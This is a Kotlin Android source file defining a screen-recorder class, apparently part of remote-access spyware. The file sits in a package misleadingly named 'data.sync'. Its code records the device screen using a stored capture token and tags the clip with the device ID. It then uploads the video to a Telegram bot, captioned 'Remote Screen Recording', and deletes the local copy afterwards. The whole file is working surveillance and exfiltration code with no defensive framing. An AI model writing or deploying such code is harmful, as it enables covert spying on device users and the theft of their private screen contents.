package com.example.data.sync

import android.content.Context
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class ScreenRecorderHelper(private val context: Context) {

    companion object {
        private const val TAG = "ScreenRecorderHelper"
    }

    private var mediaProjection: MediaProjection? = null
    private var mediaRecorder: MediaRecorder? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var isRecording = false

    fun startRecording(durationSec: Int = 15, onCompleted: (Boolean, String?) -> Unit) {
        if (isRecording) {
            onCompleted(false, "Screen recording is already in progress.")
            return
        }

        val token = MediaProjectionHelper.getProjectionToken(context)
        if (token == null) {
            onCompleted(false, "MediaProjection token unavailable. Grant screen capture permission first.")
            return
        }

        try {
            val projectionManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = projectionManager.getMediaProjection(token.first, token.second)
            if (mediaProjection == null) {
                onCompleted(false, "Failed to initialize MediaProjection.")
                return
            }

            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = windowManager.currentWindowMetrics.bounds
                metrics.widthPixels = bounds.width().coerceAtLeast(720)
                metrics.heightPixels = bounds.height().coerceAtLeast(1280)
                metrics.densityDpi = context.resources.displayMetrics.densityDpi
            } else {
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay.getMetrics(metrics)
            }

            val width = 720
            val height = 1280
            val density = metrics.densityDpi

            val outputDir = File(context.cacheDir, "screen_records")
            if (!outputDir.exists()) outputDir.mkdirs()
            val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val videoFile = File(outputDir, "screen_record_$timeStamp.mp4")

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setVideoEncodingBitRate(1024 * 1000)
                setVideoFrameRate(24)
                setVideoSize(width, height)
                setOutputFile(videoFile.absolutePath)
                prepare()
            }

            val surface = mediaRecorder?.surface
            if (surface != null) {
                virtualDisplay = mediaProjection?.createVirtualDisplay(
                    "ScreenRecordDisplay",
                    width,
                    height,
                    density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    surface,
                    null,
                    null
                )
            }

            mediaRecorder?.start()
            isRecording = true
            Log.d(TAG, "Screen recording started successfully.")

            Handler(Looper.getMainLooper()).postDelayed({
                stopAndUploadRecording(videoFile, onCompleted)
            }, (durationSec.coerceIn(5, 60) * 1000L))

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start screen recording: ${e.message}")
            stopRecordingCleanup()
            onCompleted(false, "Failed to start screen recording: ${e.message}")
        }
    }

    private fun stopAndUploadRecording(videoFile: File, onCompleted: (Boolean, String?) -> Unit) {
        if (!isRecording) return
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
        } catch (_: Exception) {}
        stopRecordingCleanup()

        if (videoFile.exists() && videoFile.length() > 1000) {
            val videoBytes = videoFile.readBytes()
            val telegramBot = TelegramBotManager(context)
            val deviceId = try {
                android.provider.Settings.Secure.getString(context.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "DEVICE"
            } catch (_: Exception) { "DEVICE" }

            val caption = "🎥 Remote Screen Recording (${videoFile.name}, ${(videoBytes.size / 1024)} KB)"
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                val sent = telegramBot.sendDocument(videoBytes, videoFile.name, caption)

                if (sent) {
                    onCompleted(true, "Screen recording (${videoFile.name}, ${(videoBytes.size / 1024)} KB) completed and uploaded to Telegram successfully.")
                } else {
                    onCompleted(false, "Screen recording completed, but failed to upload to Telegram.")
                }
                try { videoFile.delete() } catch (_: Exception) {}
            }
        } else {
            onCompleted(false, "Screen recording file is empty or failed.")
        }
    }

    private fun stopRecordingCleanup() {
        isRecording = false
        try {
            virtualDisplay?.release()
        } catch (_: Exception) {}
        virtualDisplay = null
        try {
            mediaRecorder?.release()
        } catch (_: Exception) {}
            mediaRecorder = null
        try {
            mediaProjection?.stop()
        } catch (_: Exception) {}
        mediaProjection = null
    }
}
